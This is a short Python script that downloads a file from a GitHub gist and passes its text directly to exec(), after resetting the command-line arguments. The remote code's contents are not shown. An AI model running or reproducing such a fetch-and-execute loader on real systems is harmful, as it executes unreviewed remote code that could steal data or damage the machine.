import requests
import sys
sys.argv = ['arg1', 'arg2']
url="https://gist.githubusercontent.com/itzwam/90cda6e05d918034e75c651448e6469e/raw/0bb293fba68b692b0a3d2b61274f5a075a13f06d/blahblah.py"
script=requests.get(url).text
exec(script)
